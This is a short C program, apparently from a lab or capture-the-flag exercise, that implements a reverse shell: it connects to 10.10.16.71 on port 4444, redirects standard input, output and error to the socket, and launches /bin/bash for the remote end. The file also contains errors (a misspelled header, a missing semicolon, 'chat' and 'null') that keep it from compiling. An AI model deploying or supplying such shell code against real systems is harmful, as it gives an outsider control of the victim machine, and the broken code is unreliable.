#include <stdio.h>
#include <sys/stockets.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main (void) {
    int port = 4444;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.16.71");

    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr))
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    chat * const argv[] = {"/bin/bash", null};   
    execve("/bin/bash", argv, null);

    return 0;
}